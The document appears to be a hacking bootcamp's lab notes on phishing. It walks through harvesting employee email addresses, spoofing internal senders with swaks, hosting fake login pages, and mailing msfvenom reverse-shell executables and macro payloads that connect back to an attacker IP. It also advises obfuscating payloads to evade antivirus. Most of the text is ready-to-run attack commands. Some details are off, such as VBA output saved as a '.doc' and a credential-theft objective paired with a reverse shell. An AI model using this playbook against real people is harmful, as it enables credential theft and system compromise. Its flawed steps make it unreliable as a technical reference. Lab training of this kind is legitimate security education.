# Phishing and Email-Based Attacks - Day 4

## Overview
This document outlines the labs completed on 08/02/2025 during the hacking bootcamp, focusing on phishing and email-based attack techniques.

## Table of Contents
- [Lab 1: Email Scan Easy](#lab-1-email-scan-easy)
- [Lab 2: Phishing with Attachment Easy](#lab-2-phishing-with-attachment-easy)
- [Lab 3: Phishing with Attachment Hard](#lab-3-phishing-with-attachment-hard)
- [Lab 4: Phishing with Link Easy](#lab-4-phishing-with-link-easy)
- [Lab 5: Phishing with Attachment Medium](#lab-5-phishing-with-attachment-medium)

## Labs

### Lab 1: Email Scan Easy
#### Objective
Identify email addresses on a target network using open-source intelligence.

#### Vulnerabilities
- Exposed Email Addresses: Publicly accessible web pages or directories leak email addresses.

#### Requirements
Target website or network must be accessible for scanning.

#### Steps
1. **Setup**
   - Verify connectivity to the target network.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Scan for email addresses using theHarvester.
   ```bash
   theHarvester -d <TARGET_DOMAIN> -b google -l 100
   ```
3. **Exploitation**
   - Save discovered emails to a file for phishing campaigns.
   ```bash
   theHarvester -d <TARGET_DOMAIN> -b google -f emails.txt
   ```

#### Why It Works
Publicly exposed email addresses on websites or search engines can be harvested for targeted phishing attacks.

#### Alternatives
- Manually scrape emails from target website pages.

#### Resources
- [theHarvester Documentation: https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)

#### Notes
- Use multiple search engines (e.g., Bing, LinkedIn) for broader coverage.

---

### Lab 2: Phishing with Attachment Easy
#### Objective
Steal credentials by sending a phishing email with a malicious HTML attachment linking to a fake login page.

#### Vulnerabilities
- User Trust: Employees may open attachments and click links from seemingly legitimate emails.

#### Requirements
Target SMTP server must be accessible, and a phishing website must be hosted.

#### Steps
1. **Setup**
   - Perform network reconnaissance to identify the SMTP server.
   ```bash
   nmap -sV -p 25,587 <TARGET_IP>
   ```
2. **Reconnaissance**
   - Harvest email addresses from the target’s employee page.
   ```bash
   curl http://<TARGET_DOMAIN>/employees | grep -E -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
   ```
3. **Exploitation**
   - Create and deploy a phishing website with a POST request for credentials.
   ```bash
   python3 phishing.py
   ```
   - Send a phishing email with a malicious HTML attachment using swaks.
   ```bash
   swaks \
     --to maria@knight.com \
     --from admin@knight.com \
     --server 10.10.0.146 \
     --header "Subject: Important Document" \
     --body "Dear user,\n\nPlease find attached the document you requested.\n\nBest regards,\nSupport Team" \
     --attach-type text/html \
     --attach-name "Document.html" \
     --attach-body "<html><body> http://10.10.0.118:5000/login </body></html>" \
     --port 587
   ```

#### Why It Works
Users trusting the email’s source open the HTML attachment, visit the fake login page, and submit credentials to the attacker’s server.

#### Alternatives
- Use a malicious PDF attachment to deliver the phishing link.

#### Resources
- [Swaks Documentation: https://www.jetmore.org/john/code/swaks/](https://www.jetmore.org/john/code/swaks/)
- [Phishing Guide: https://www.hacktricks.xyz/pentesting/pentesting-web/phishing](https://www.hacktricks.xyz/pentesting/pentesting-web/phishing)

#### Notes
- Ensure the phishing website (phishing.py) is hosted and accessible.
- Verify SMTP server allows relaying or spoofing.

---

### Lab 3: Phishing with Attachment Hard
#### Objective
Steal credentials by sending a phishing email with a malicious executable attachment.

#### Vulnerabilities
- User Execution: Users may execute malicious attachments from trusted-looking emails.

#### Requirements
Target SMTP server must allow email delivery, and a malicious executable must be prepared.

#### Steps
1. **Setup**
   - Verify connectivity to the SMTP server.
   ```bash
   nmap -p 25,587 <TARGET_IP>
   ```
2. **Reconnaissance**
   - Gather target email addresses from public sources.
   ```bash
   theHarvester -d <TARGET_DOMAIN> -b bing -l 100
   ```
3. **Exploitation**
   - Create a malicious executable (e.g., reverse shell) using msfvenom.
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o malicious.exe
   ```
   - Send the executable as an email attachment using swaks.
   ```bash
   swaks --to user@<TARGET_DOMAIN> --from admin@<TARGET_DOMAIN> --server <SMTP_IP> --header "Subject: Urgent Update" --body "Please run the attached update." --attach malicious.exe --port 587
   ```

#### Why It Works
Users executing the malicious attachment trigger a reverse shell, granting attacker access to the victim’s system.

#### Alternatives
- Use a macro-enabled Word document for payload delivery.

#### Resources
- [Msfvenom Guide: https://www.offensive-security.com/metasploit-unleashed/msfvenom/](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

#### Notes
- Set up a listener (e.g., Metasploit) before sending the email.
- Obfuscate the executable to bypass antivirus.

---

### Lab 4: Phishing with Link Easy
#### Objective
Steal credentials by sending a phishing email with a link to a fake login page.

#### Vulnerabilities
- User Trust: Users may click links in emails from seemingly legitimate sources.

#### Requirements
Target SMTP server must be accessible, and a phishing website must be hosted.

#### Steps
1. **Setup**
   - Verify connectivity to the SMTP server.
   ```bash
   nmap -p 25,587 <TARGET_IP>
   ```
2. **Reconnaissance**
   - Harvest email addresses from the target domain.
   ```bash
   theHarvester -d <TARGET_DOMAIN> -b google -l 50
   ```
3. **Exploitation**
   - Host a phishing website with a credential-stealing form.
   ```bash
   python3 -m http.server 80
   ```
   - Send a phishing email with the link using swaks.
   ```bash
   swaks --to user@<TARGET_DOMAIN> --from admin@<TARGET_DOMAIN> --server <SMTP_IP> --header "Subject: Account Verification" --body "Please verify your account: http://<ATTACKER_IP>/login" --port 587
   ```

#### Why It Works
Users clicking the link in the email visit the fake login page and submit credentials to the attacker’s server.

#### Alternatives
- Use a URL shortener to mask the phishing link.

#### Resources
- [Phishing Techniques: https://www.hacktricks.xyz/pentesting/pentesting-web/phishing](https://www.hacktricks.xyz/pentesting/pentesting-web/phishing)

#### Notes
- Ensure the phishing website is convincing and accessible.

---

### Lab 5: Phishing with Attachment Medium
#### Objective
Steal credentials by sending a phishing email with a macro-enabled document attachment.

#### Vulnerabilities
- Macro Execution: Users enabling macros in documents trigger malicious payloads.

#### Requirements
Target SMTP server must allow email delivery, and a macro-enabled document must be prepared.

#### Steps
1. **Setup**
   - Verify connectivity to the SMTP server.
   ```bash
   nmap -p 25,587 <TARGET_IP>
   ```
2. **Reconnaissance**
   - Collect target email addresses from public sources.
   ```bash
   theHarvester -d <TARGET_DOMAIN> -b linkedin -l 50
   ```
3. **Exploitation**
   - Create a macro-enabled document with a malicious payload.
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f vba -o malicious.doc
   ```
   - Send the document as an email attachment using swaks.
   ```bash
   swaks --to user@<TARGET_DOMAIN> --from admin@<TARGET_DOMAIN> --server <SMTP_IP> --header "Subject: Invoice Review" --body "Please review the attached invoice." --attach malicious.doc --port 587
   ```

#### Why It Works
Users enabling macros in the document execute the embedded payload, granting attacker access via a reverse shell.

#### Alternatives
- Use a malicious HTML attachment linking to a phishing page.

#### Resources
- [Msfvenom Macro Guide: https://www.offensive-security.com/metasploit-unleashed/vba-payloads/](https://www.offensive-security.com/metasploit-unleashed/vba-payloads/)

#### Notes
- Start a Metasploit listener before sending the email.
- Test the macro document in a safe environment.

---